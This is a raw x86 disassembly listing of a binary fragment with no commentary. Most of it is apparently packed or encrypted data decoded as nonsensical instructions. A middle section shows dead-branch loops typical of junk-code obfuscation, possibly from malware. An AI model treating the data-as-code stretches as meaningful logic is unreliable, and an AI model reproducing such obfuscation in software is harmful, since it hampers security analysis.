  40ce5a:	mov    al,ds:0x6d37a626
  40ce5f:	daa    
  40ce60:	push   0x50c3eee1
  40ce65:	(bad)  
  40ce66:	jmp    0x98c8:0x8638d4f4
  40ce6d:	xlat   BYTE PTR ds:[ebx]
  40ce6e:	into   
  40ce6f:	sub    DWORD PTR [edx-0x313f5106],ecx
  40ce75:	adc    DWORD PTR [eax+0x18],eax
  40ce78:	adc    BYTE PTR [esi],al
  40ce7a:	dec    ecx
  40ce7b:	add    dh,BYTE PTR [ebp-0x30]
  40ce7e:	cmp    esp,DWORD PTR [ecx+edx*2+0x59]
  40ce82:	adc    DWORD PTR [edx+0x60deaf16],ecx
  40ce88:	or     esi,DWORD PTR [ebp+ebx*8+0x57cd4c]
  40ce8f:	or     eax,0xddaef255
  40ce94:	cmc    
  40ce95:	push   edi
  40ce96:	mov    ah,0x64
  40ce98:	cmp    BYTE PTR [edi],0xab
  40ce9b:	dec    edx
  40ce9c:	daa    
  40ce9d:	cmp    DWORD PTR [ebp+0xf],ebp
  40cea0:	mul    bl
  40cea2:	dec    edi
  40cea3:	add    DWORD PTR ds:0xfb63005,ebp
  40cea9:	gs inc eax
  40ceab:	cmp    DWORD PTR [ebx+0x2eaae216],esp
  40ceb1:	mov    edi,0xfc80582e
  40ceb6:	ds test eax,0x8835b455
  40cebc:	mov    eax,0xec61c1a9
  40cec1:	ror    DWORD PTR [ebx],cl
  40cec3:	nop
  40cec4:	mov    ds:0x75417efe,eax
  40cec9:	adc    DWORD PTR [eax-0x777422b0],edi
  40cecf:	push   ebp
  40ced0:	dec    ebp
  40ced1:	shl    BYTE PTR [ebx+ecx*1],1
  40ced4:	sub    DWORD PTR [ebp+0x13],ebx
  40ced7:	(bad)
  40cedb:	fidiv  DWORD PTR [edi-0x4b13a89a]
  40cee1:	daa    
  40cee2:	enter  0x8664,0xde
  40cee6:	lods   eax,DWORD PTR ds:[esi]
  40cee7:	sbb    eax,0x208d19b6
  40ceec:	lea    ebx,[eax+0x120f9a0c]
  40cef2:	and    eax,0x30b5ab45
  40cef7:	daa    
  40cef8:	mov    DWORD PTR ds:0xaffe5a9b,esp
  40cefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceff:	stc    
  40cf00:	sub    dh,BYTE PTR ds:0xedca03c
  40cf06:	mov    ds:0x3ecef214,al
  40cf0b:	les    edx,FWORD PTR [edi]
  40cf0d:	out    0x34,al
  40cf0f:	xlat   BYTE PTR ds:[ebx]
  40cf10:	shl    DWORD PTR [eax],1
  40cf12:	dec    eax
  40cf13:	add    ecx,eax
  40cf15:	test   eax,eax
  40cf17:	mov    ebp,0x84677aa
  40cf1c:	mov    ds:0xd8b39e5c,al
  40cf21:	mov    dl,0xd2
  40cf23:	xchg   ebx,eax
  40cf24:	sbb    eax,0x6982fdf4
  40cf29:	mov    eax,ds:0x5893114f
  40cf2f:	fwait
  40cf30:	bound  esi,QWORD PTR [ebx-0x752a92fc]
  40cf36:	add    ah,BYTE PTR [esi]
  40cf38:	xchg   BYTE PTR [esi],cl
  40cf3a:	jle    0x40cf5b
  40cf3c:	jge    0x40cfb4
  40cf3e:	adc    BYTE PTR [ecx-0x50a70884],bh
  40cf44:	dec    eax
  40cf45:	mov    ebx,DWORD PTR [edx-0x65f469d3]
  40cf4b:	pop    eax
  40cf4c:	mov    DWORD PTR [ebp+0x7f],edx
  40cf4f:	lock je 0x40cfa9
  40cf52:	shl    BYTE PTR [edi+eiz*1-0x1a],1
  40cf56:	aam    0xc1
  40cf58:	add    ch,BYTE PTR [edx]
  40cf5a:	xchg   ebp,eax
  40cf5b:	mov    es,edx
  40cf5d:	and    DWORD PTR [edx+ecx*1-0x46],esi
  40cf61:	dec    edi
  40cf62:	data16 jle 0x40cf4b
  40cf65:	pop    ecx
  40cf66:	mov    al,0x98
  40cf68:	push   0xffffffa6
  40cf6a:	and    al,0x78
  40cf6c:	or     eax,0xebe7deef
  40cf71:	and    al,0xc3
  40cf73:	mov    ah,0x10
  40cf75:	jl     0x40cf13
  40cf77:	cli    
  40cf78:	ins    DWORD PTR es:[edi],dx
  40cf79:	dec    ebx
  40cf7a:	js     0x40cf30
  40cf7c:	xlat   BYTE PTR ds:[ebx]
  40cf7d:	pushf  
  40cf7e:	pop    edi
  40cf7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf80:	sbb    bl,ah
  40cf82:	add    eax,0x65
  40cf85:	sbb    ebp,ebp
  40cf87:	adc    al,0xc7
  40cf89:	pop    esp
  40cf8a:	mov    dh,0xa8
  40cf8c:	fisttp WORD PTR [eax-0x2d]
  40cf8f:	xor    DWORD PTR [ecx],eax
  40cf91:	mov    esi,DWORD PTR [ebp-0x6]
  40cf94:	sbb    cl,cl
  40cf96:	mov    ch,0x0
  40cf98:	(bad)  
  40cf9a:	shl    ebp,1
  40cf9c:	loopne 0x40cf99
  40cf9e:	out    0xc8,al
  40cfa0:	imul   edx,DWORD PTR [ecx],0x2c
  40cfa3:	add    al,0xd2
  40cfa5:	push   0x3d
  40cfa7:	jbe    0x40cff6
  40cfa9:	(bad)  
  40cfaa:	fdivr  st,st(5)
  40cfac:	call   0x219c070c
  40cfb1:	mov    dl,0x86
  40cfb3:	and    al,0x13
  40cfb5:	mov    ss,WORD PTR [edx+0x55c87872]
  40cfbb:	jmp    0x40cf72
  40cfbd:	dec    ecx
  40cfbe:	(bad)  
  40cfc1:	out    dx,al
  40cfc2:	xor    BYTE PTR [bp+di-0x2],ah
  40cfc6:	xor    DWORD PTR [eax+0xee9fb99],ebp
  40cfcc:	jne    0x40cf79
  40cfce:	fmul   DWORD PTR [eax+ebx*4]
  40cfd1:	cs (bad) 
  40cfd4:	sbb    ecx,DWORD PTR [edx]
  40cfd6:	and    al,0x90
  40cfd8:	mov    ecx,0x6cf7b287
  40cfdd:	mov    esi,DWORD PTR [ecx-0x5ed336e9]
  40cfe3:	stos   BYTE PTR es:[edi],al
  40cfe4:	in     eax,0xd3
  40cfe6:	jne    0x40cfcd
  40cfe8:	cmp    DWORD PTR [edx+esi*1],eax
  40cfeb:	fucomip st,st(6)
  40cfed:	loopne 0x40cfd6
  40cfef:	aad    0xc2
  40cff1:	imul   edi,DWORD PTR [esi+eax*4],0xbb210124
  40cff8:	add    ah,BYTE PTR [eax-0x1acd7fd1]
  40cffe:	mov    cl,0xc5
  40d000:	test   al,0xec
  40d002:	dec    esp
  40d003:	mov    bh,0x92
  40d005:	or     dl,BYTE PTR [esp+eiz*4+0x7f0b4e4f]
  40d00c:	and    ebx,DWORD PTR [esi+0x1f]
  40d00f:	aas    
  40d010:	dec    edx
  40d011:	lods   eax,DWORD PTR ds:[esi]
  40d012:	adc    DWORD PTR [esi],esp
  40d014:	punpckhdq mm4,QWORD PTR [ecx+0xe]
  40d018:	nop
  40d019:	jge    0x40cfeb
  40d01b:	xor    eax,0x4924b39a
  40d020:	and    esp,DWORD PTR [eax+0x19e23c87]
  40d026:	(bad)  
  40d027:	out    0xe2,al
  40d029:	aad    0xf1
  40d02b:	es mov esp,0xde28f0ed
  40d031:	in     al,0x9d
  40d033:	and    edi,DWORD PTR [esi+0x77402190]
  40d039:	mov    ecx,0x204db0cb
  40d03e:	rcl    DWORD PTR [ecx-0x4b],0x93
  40d042:	aam    0x76
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4342be
  40d088:	mov    ecx,DWORD PTR ds:0x432872
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434296,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434296,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434296,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432b6a
  40d0d1:	cmp    DWORD PTR ds:0x434296,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434296
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434296,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434296
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434296,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434272,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434272
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434272,ecx
  40d118:	cmp    DWORD PTR ds:0x434272,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434272,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432cc6
  40d137:	call   DWORD PTR ds:0x4328ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432d6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434331
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43427e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432cde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432604,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434321,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43428a,0x11
  40d197:	cmp    DWORD PTR ds:0x43428a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43428a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432b6e
  40d1c4:	cmp    DWORD PTR ds:0x43428a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43428a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43428a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43428a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43428a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432cd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434296
  40d1fe:	mov    DWORD PTR ds:0x432cd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43426e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434325,0x43426a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434276,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434315,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434321,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434321
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434321,ecx
  40d255:	cmp    DWORD PTR ds:0x434321,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434321,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4328f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4325fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4325fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4325fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432c22
  40d2ba:	cmp    DWORD PTR ds:0x4325fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4325fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4325fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4325fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4325fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4325f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434329
  40d2fa:	add    DWORD PTR ds:0x434292,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0xfb06624d
  40d319:	push   ds
  40d31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d31b:	jle    0x40d2aa
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d2d1
  40d324:	rol    BYTE PTR [ecx],0x5
  40d327:	lods   al,BYTE PTR ds:[esi]
  40d328:	mov    dl,0x6e
  40d32a:	int3   
  40d32b:	push   cs
  40d32c:	inc    eax
  40d32d:	psubusw mm1,QWORD PTR [esi]
  40d330:	jnp    0x40d316
  40d332:	ret    
  40d333:	mov    eax,ds:0xfc57ed9d
  40d338:	enter  0xc098,0x15
  40d33c:	rol    DWORD PTR [edi-0x5e],0xf3
  40d340:	sbb    DWORD PTR [edx],ebx
  40d342:	or     edx,DWORD PTR [eax+0x38]
  40d345:	int    0xe0
  40d347:	ja     0x40d364
  40d349:	dec    edx
  40d34a:	bound  ecx,QWORD PTR [ecx+edx*1-0x4a]
  40d34e:	cmp    BYTE PTR [edi],dl
  40d350:	lods   al,BYTE PTR ds:[esi]
  40d351:	and    edi,esp
  40d353:	fwait
  40d354:	ja     0x40d36e
  40d356:	das    
  40d357:	mov    DWORD PTR [edi-0x7c],esi
  40d35a:	outs   dx,BYTE PTR ds:[esi]
  40d35b:	push   ebx
  40d35c:	ficomp DWORD PTR [eax+0x10]
  40d35f:	aas    
  40d360:	lahf   
  40d361:	daa    
  40d362:	rcl    DWORD PTR [edx],1
  40d364:	loope  0x40d30b
  40d366:	jno    0x40d332
  40d368:	ret    0x637b
  40d36b:	jmp    0x6454150e
  40d370:	loope  0x40d3ee
  40d372:	in     eax,dx
  40d373:	mov    ebp,0x61e137b1
  40d378:	pop    esp
  40d379:	mov    ah,0xad
  40d37b:	enter  0xde50,0x84
  40d37f:	(bad)  
  40d380:	xor    bl,dh
  40d382:	fist   DWORD PTR [ebx+0x4dcf05b9]
  40d388:	bound  esi,QWORD PTR [ebp+0x16]
  40d38b:	add    al,BYTE PTR [edx]
  40d38d:	and    al,BYTE PTR [edx+0x2e754a0d]
  40d393:	leave  
  40d394:	xor    ah,BYTE PTR [edi+0x73]
  40d397:	inc    edx
  40d398:	gs aad 0x14
  40d39b:	leave  
  40d39c:	bound  edx,QWORD PTR [ebp-0x756ada9]
  40d3a2:	adc    esi,edi
  40d3a4:	cmp    eax,0x6a5c7e0a
  40d3a9:	mov    ecx,0xd4ba984c
  40d3ae:	cdq    
  40d3af:	retfw  
  40d3b1:	or     DWORD PTR [edi],0xe4c2baf6
  40d3b7:	div    BYTE PTR [eax-0x6a]
  40d3ba:	xchg   DWORD PTR [ebx-0x10b341ac],ebp
  40d3c0:	fincstp 
  40d3c2:	in     al,0xa6
  40d3c4:	mov    ds:0xa19decb6,al
  40d3c9:	inc    ebp
  40d3ca:	mov    edi,DWORD PTR [eax-0x27ff9f92]
  40d3d0:	jmp    0x40d3cd
  40d3d2:	add    al,0x37
  40d3d4:	push   esi
  40d3d5:	pop    ds
  40d3d6:	arpl   WORD PTR [ebx],sp
  40d3d8:	gs mov dh,0x46
  40d3db:	pop    eax
  40d3dc:	dec    ebx
  40d3dd:	addr16 adc dh,cl
  40d3e0:	and    bh,BYTE PTR [esi]
  40d3e2:	leave  
  40d3e3:	xchg   edx,edx
  40d3e5:	mov    ds:0xa71a1e69,al
  40d3ea:	popf   
  40d3eb:	mov    cl,0x99
  40d3ed:	cdq    
  40d3ee:	je     0x40d3d3
  40d3f0:	adc    al,0xfc
  40d3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3f3:	pop    ebx
  40d3f4:	(bad)  
  40d3f5:	jns    0x40d3a9
  40d3f7:	xchg   ecx,eax
  40d3f8:	jno    0x40d46a
  40d3fa:	and    DWORD PTR [ebp+edi*8-0x8],ebx
  40d3fe:	pop    ds
  40d3ff:	cmp    al,0x33
  40d401:	dec    esp
  40d402:	xchg   ecx,eax
  40d403:	inc    ebp
  40d404:	dec    eax
  40d405:	ins    BYTE PTR es:[edi],dx
  40d406:	xchg   ecx,eax
  40d407:	sbb    BYTE PTR [eax+0x18],ch
  40d40a:	and    DWORD PTR [bp+di+0x42d9],esi
  40d40f:	mov    ch,0xf3
  40d411:	mov    esp,DWORD PTR [ebx-0x3d664842]
  40d417:	pop    esi
  40d418:	cli    
  40d419:	sahf   
  40d41a:	outs   dx,DWORD PTR ds:[esi]
  40d41b:	pop    ss
  40d41c:	ret    0x6ed4
  40d41f:	scas   eax,DWORD PTR es:[edi]
  40d420:	loopne 0x40d449
  40d422:	(bad)  
  40d423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d424:	adc    ch,BYTE PTR [eax-0x2c366ccb]
  40d42a:	cld    
  40d42b:	loope  0x40d40c
  40d42d:	xor    BYTE PTR [edi+0x15],cl
  40d430:	cwde   
  40d431:	push   0xfefdcaf1
  40d436:	call   0x39ca:0x3240d407
  40d43d:	lsl    esp,WORD PTR [edi]
  40d440:	jp     0x40d466
  40d442:	and    ebx,DWORD PTR [edi-0x5e38acdb]
  40d448:	xchg   ecx,eax
  40d449:	adc    al,0xab
  40d44b:	ins    DWORD PTR es:[edi],dx
  40d44c:	pop    edi
  40d44d:	lock jecxz 0x40d44b
  40d450:	pop    ecx
  40d451:	mov    edi,0x395f5072
  40d456:	arpl   WORD PTR [eax],sp
  40d458:	scas   eax,DWORD PTR es:[edi]
  40d459:	nop
  40d45a:	inc    esp
  40d45b:	in     al,dx
  40d45c:	cmp    ah,BYTE PTR [edx-0x48]
  40d45f:	mov    ah,0x2
  40d461:	mov    eax,ds:0xf0890e38
  40d466:	jnp    0x40d3ef
  40d468:	add    ah,dl
  40d46a:	or     dl,dl
  40d46c:	pusha  
  40d46d:	xchg   edi,eax
  40d46e:	clc    
  40d46f:	in     eax,0x81
  40d471:	inc    esi
  40d472:	daa    
  40d473:	xor    bl,BYTE PTR [ebp-0x33]
  40d476:	gs ins BYTE PTR es:[edi],dx
  40d478:	push   ss
  40d479:	test   al,0x5a
  40d47b:	add    eax,0x1e5ca0bb
  40d480:	and    al,0xd4
  40d482:	sbb    al,0xa2
  40d484:	enter  0x4ae0,0xf
  40d488:	dec    esi
  40d489:	dec    edx
  40d48a:	jo     0x40d43c
  40d48c:	mov    al,ds:0xd4e5667b
  40d491:	push   es
  40d492:	jne    0x40d479
  40d494:	cmp    DWORD PTR [ebp-0x67b7968e],ebp
  40d49a:	mov    ah,0x54
  40d49c:	or     dl,BYTE PTR [ebp-0x54c34f9]
  40d4a2:	or     ah,BYTE PTR [edx+0x2c8170fc]
  40d4a8:	mov    dl,0x72
  40d4aa:	lods   al,BYTE PTR ds:[esi]
  40d4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ac:	cmc    
  40d4ad:	adc    al,0xcd
  40d4af:	pop    ebp
  40d4b0:	repnz push esi
  40d4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4b3:	jb     0x40d4ce
  40d4b5:	mov    al,ds:0x736d8d04
  40d4ba:	fstp   DWORD PTR [ebx-0x5b]
  40d4bd:	dec    ebx
  40d4be:	mov    esp,0x3b264df1
  40d4c3:	in     eax,dx
  40d4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4c5:	stc    
  40d4c6:	inc    esp
  40d4c7:	aad    0xc6
  40d4c9:	les    esp,FWORD PTR [eax]
  40d4cb:	sbb    dh,dl
  40d4cd:	or     DWORD PTR [esp+edx*4],esi
  40d4d0:	leave  
  40d4d1:	add    dl,bh
  40d4d3:	lds    ecx,FWORD PTR [edi-0x4b]
  40d4d6:	daa    
  40d4d7:	xor    DWORD PTR ss:[edx],esp
  40d4da:	dec    bp
  40d4dc:	stos   DWORD PTR es:[edi],eax
  40d4dd:	add    BYTE PTR gs:[edi-0x5b],dh
  40d4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e2:	ins    DWORD PTR es:[di],dx
  40d4e4:	mov    bh,0xa5
  40d4e6:	mov    bh,0xc
  40d4e8:	and    edx,ebx
  40d4ea:	cmp    ecx,ebx
  40d4ec:	rcr    DWORD PTR [edi],1
  40d4ee:	sub    esi,DWORD PTR [ebp-0x422c3d7a]
  40d4f4:	xchg   edi,eax
  40d4f5:	aad    0xcd
  40d4f7:	cld    
  40d4f8:	inc    edi
  40d4f9:	xchg   ebp,eax
  40d4fb:	or     esi,esi
  40d4fd:	leave  
  40d4fe:	add    bh,ah
  40d500:	cmp    al,0x12
  40d502:	sti    
  40d503:	scas   eax,DWORD PTR es:[edi]
  40d504:	jg     0x40d554
  40d506:	jl     0x40d560
  40d508:	outs   dx,DWORD PTR ds:[esi]
  40d509:	imul   esi,edi,0x75
  40d50c:	push   cx
  40d50e:	repz adc DWORD PTR [ebp+0x5405f1b5],ebx
  40d515:	cli    
  40d516:	pop    eax
  40d517:	push   cs
  40d518:	dec    edx
  40d519:	xor    DWORD PTR [ebp-0x48],eax
  40d51c:	sahf   
  40d51d:	inc    esp
  40d51e:	aam    0xc1
  40d520:	fsub   DWORD PTR [ebp-0x22935a72]
  40d526:	add    bh,BYTE PTR [ebx-0x7a66865a]
  40d52c:	ret    
  40d52d:	mov    ebx,0x6c35a187
  40d532:	dec    edx
  40d533:	cmp    eax,0xa1ecfc1e
  40d538:	push   ds
  40d539:	jle    0x40d4d1
  40d53b:	gs data16 sti 
  40d53e:	cmp    edi,DWORD PTR [ecx+0x7e7e5d7a]
  40d544:	mov    gs,WORD PTR [edx]
  40d546:	pop    edx
  40d547:	(bad)  
  40d548:	int3   
  40d549:	inc    esp
  40d54a:	fwait
  40d54b:	in     eax,0x4b
  40d54d:	dec    ebp
  40d54e:	or     al,BYTE PTR [edi+edi*4-0x79]
  40d552:	test   al,0x4f
  40d554:	mov    DWORD PTR [eax-0x352ac34],0x3f5b98a0
  40d55e:	jecxz  0x40d5cf
  40d560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d561:	pop    ecx
  40d562:	jae    0x40d577
  40d564:	add    eax,0x3c69f5dc
  40d569:	add    DWORD PTR [eax+0x6950b4da],eax
  40d56f:	ds mov al,ch
  40d572:	xchg   ebx,eax
  40d573:	daa    
  40d574:	shl    ebx,1
  40d576:	sub    BYTE PTR ds:0xaa707f89,0xe1
  40d57d:	cmp    al,0x63
  40d57f:	add    eax,0xd2c6daa3
  40d584:	or     dl,BYTE PTR [edi]
  40d586:	mov    edi,0xbcd9e628
  40d58b:	cmp    al,BYTE PTR [ebp+0x6f]
  40d58e:	les    edi,FWORD PTR [eax]
  40d590:	ret    0x392b
  40d593:	fs jmp 0xc90:0x35539949
  40d59b:	jg     0x40d5fd
  40d59d:	sbb    BYTE PTR [eax-0x6caaf795],bl
  40d5a3:	xor    dl,BYTE PTR [ecx]
  40d5a5:	and    DWORD PTR [edx],esi
  40d5a7:	pop    esp
  40d5a8:	in     eax,dx
  40d5a9:	lock cs scas eax,DWORD PTR es:[edi]
  40d5ac:	jmp    0xfc58f5c4
  40d5b1:	aam    0xba
  40d5b3:	adc    eax,0xd608bfb
  40d5b8:	div    DWORD PTR [ebp+0x3dea49e2]
  40d5be:	(bad)  
  40d5bf:	cmc    
  40d5c0:	sub    al,0x67
  40d5c2:	cli    
  40d5c3:	and    eax,0x625fbfda
  40d5c8:	dec    eax
  40d5c9:	inc    esp
  40d5ca:	dec    esp
  40d5cb:	aas    
  40d5cc:	nop
  40d5cd:	push   esi
  40d5ce:	dec    ebx
  40d5cf:	imul   edi,DWORD PTR [eax],0x60bdd617
  40d5d5:	popa   
  40d5d6:	xor    ah,0xcf
  40d5d9:	mov    BYTE PTR [ebp+0x13],bl
  40d5dc:	mov    edi,0x9a0cdec
  40d5e1:	gs pop esi
  40d5e3:	pop    esi
  40d5e4:	cld    
  40d5e5:	iret   
  40d5e6:	fcomp  QWORD PTR [eax-0x20cd5057]
  40d5ec:	jecxz  0x40d644
  40d5ee:	mov    esp,0x4935fce8
  40d5f3:	sub    edx,DWORD PTR [edi-0x1c]
  40d5f6:	fs jno 0x40d5ee
  40d5f9:	mov    WORD PTR ds:0x678cd6fe,ss
  40d5ff:	push   0x252f72ca
  40d604:	pop    ss
  40d605:	xchg   esi,eax
  40d606:	push   edi
  40d607:	inc    esi
  40d608:	std    
  40d609:	jne    0x40d64f
  40d60b:	ins    DWORD PTR es:[edi],dx
  40d60c:	pop    ebp
  40d60d:	jg     0x40d629
  40d60f:	sub    DWORD PTR [esi],0x914a3ce
  40d615:	in     eax,dx
  40d616:	mov    ?,WORD PTR [ebx+0x1e]
  40d619:	mov    edi,0x7d9ce21d
  40d61e:	push   cs
  40d61f:	cmp    dh,BYTE PTR [edx]
  40d621:	retf   
  40d622:	sub    eax,0xaf0e40cc
  40d627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d628:	adc    BYTE PTR [edx-0x60],dl
  40d62b:	ss pop ss
  40d62d:	shl    DWORD PTR [esi+0x5ef39005],1
  40d633:	jecxz  0x40d5da
  40d635:	mov    eax,0x28152258
  40d63a:	pop    esi
  40d63b:	sti    
  40d63c:	inc    esp
  40d63d:	mov    cl,0x68
  40d63f:	dec    esi
  40d640:	dec    ebp
  40d641:	pop    esi
  40d642:	adc    dl,bl
  40d644:	xchg   esi,eax
  40d645:	mov    edx,0x94598c67
  40d64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d64b:	mov    bh,0x21
  40d64d:	add    DWORD PTR [ebx-0x4384e9ee],0xffffff9e
  40d654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d655:	nop
  40d656:	pop    ebp
  40d657:	xor    ecx,DWORD PTR [edx+0x2a7c1e32]
  40d65d:	xor    eax,0x6e90d8e7
  40d662:	pop    es
  40d663:	arpl   WORD PTR [ebx-0x2dab2c35],bp
  40d669:	pop    ds
  40d66a:	sub    esp,DWORD PTR [edx+eiz*8+0x71]
  40d66e:	outs   dx,DWORD PTR ds:[esi]
  40d66f:	mov    BYTE PTR [edx+0x71a8f236],0x7c
  40d676:	mov    dl,0x15
  40d678:	xchg   ebp,eax
  40d679:	inc    esp
  40d67a:	aas    
  40d67b:	add    eax,0x5070108
  40d680:	jae    0x40d6c7
  40d682:	xor    BYTE PTR [ebx],cl
  40d684:	push   ebx
  40d685:	inc    eax
  40d686:	test   DWORD PTR [ebp+0x213f6282],ecx
  40d68c:	mov    ebp,0x475ff19a
  40d691:	xchg   edx,eax
  40d692:	xor    ah,BYTE PTR [ecx+0x3777463a]
  40d698:	jns    0x40d6b3
  40d69a:	inc    eax
  40d69b:	or     eax,0x95d926d9
  40d6a0:	mov    ah,0x71
  40d6a2:	je     0x40d643
  40d6a4:	push   esp
  40d6a5:	daa    
  40d6a6:	inc    esp
  40d6a7:	adc    DWORD PTR [ecx],esp
  40d6a9:	mov    eax,0xb5219c21
  40d6ae:	sar    BYTE PTR [ecx+ebp*8+0x4a8b7125],cl
  40d6b5:	loopne 0x40d6bd
  40d6b7:	bnd jne 0x40d675
  40d6ba:	popf   
  40d6bb:	push   ds
  40d6bc:	dec    esi
  40d6bd:	push   ecx
  40d6be:	xor    DWORD PTR [ebp+0x4c2611a8],ecx
  40d6c4:	out    dx,eax
  40d6c5:	cmp    DWORD PTR ds:0x7efe3f66,ecx
  40d6cb:	inc    eax
  40d6cc:	and    edx,DWORD PTR [edi+ebx*4+0xd923011]
  40d6d3:	dec    ecx
  40d6d4:	mov    BYTE PTR [edi+0x17],ch
  40d6d7:	dec    esi
  40d6d8:	xchg   esi,eax
  40d6d9:	mov    al,ds:0xa5dadd82
  40d6de:	popa   
